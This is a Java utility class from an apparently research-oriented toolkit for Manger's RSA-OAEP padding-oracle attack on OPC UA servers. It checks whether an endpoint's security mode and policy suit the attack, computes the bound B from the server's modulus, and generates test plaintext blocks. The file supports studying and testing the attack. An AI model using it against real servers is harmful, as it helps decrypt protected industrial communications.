package attacks.manger;

import attacks.manger.oracle.OracleException;
import opcua.context.Endpoint;
import opcua.security.MessageSecurityMode;
import opcua.security.SecurityPolicy;

import java.math.BigInteger;
import java.security.SecureRandom;
import java.security.interfaces.RSAPublicKey;

/**
 * Provides utility functions regarding Manger's atack
 */
public class MangerUtility {

    /**
     * Throws oracle exception if given endpoint is not suitable for Manger's attack
     * @param endpoint Endpoint to test
     * @throws OracleException
     */
    public static void throwIfSecurityConfigurationUnsupported(Endpoint endpoint) throws OracleException {
        if(endpoint.getMessageSecurityMode() != MessageSecurityMode.SIGN_AND_ENCRYPT) {
            throw new OracleException("Invalid message security mode");
        }
        if(endpoint.getSecurityPolicy() == SecurityPolicy.NONE || endpoint.getSecurityPolicy() == SecurityPolicy.BASIC128_RSA15) {
            throw new OracleException("Invalid security policy");
        }
    }

    /**
     * Computes B (See original paper of Manger's attack)
     * @param publicKey Public key of the target server
     * @return B
     */
    public static BigInteger computeB(RSAPublicKey publicKey) {
        int blockBitLength = publicKey.getModulus().bitLength();
        return BigInteger.ONE.shiftLeft(blockBitLength-8);
    }

    /**
     * Generates a random plaintext block <B
     * @param publicKey Public key of the target server
     * @return m<B
     */
    public static byte[] generatePlaintextLessB(RSAPublicKey publicKey) {
        int blockSize = publicKey.getModulus().bitLength() / 8;
        SecureRandom secureRandom = new SecureRandom();
        byte[] plainBlock = new byte[blockSize];
        secureRandom.nextBytes(plainBlock);
        plainBlock[0] = (byte)0;
        return plainBlock;
    }

    /**
     * Generates a random plaintext block >=B
     * @param publicKey Public key of the target server
     * @return m>=B
     */
    public static byte[] generatePlaintextGeqB(RSAPublicKey publicKey) {
        BigInteger B = computeB(publicKey);
        BigInteger N = publicKey.getModulus();
        int blockSize = publicKey.getModulus().bitLength() / 8;
        SecureRandom secureRandom = new SecureRandom();
        byte[] plainBlock = new byte[blockSize];
        do {
            secureRandom.nextBytes(plainBlock);
        } while (new BigInteger(plainBlock).compareTo(N) > 0 || new BigInteger(plainBlock).compareTo(B) < 0);
        return plainBlock;
    }

    /**
     * Returns ceil(nominator/divisor)
     */
    public static BigInteger divideCeiling(BigInteger nominator, BigInteger divisor) {
        if(nominator.mod(divisor).equals(BigInteger.ZERO)) {
            return nominator.divide(divisor);
        }
        return nominator.divide(divisor).add(BigInteger.ONE);
    }
}
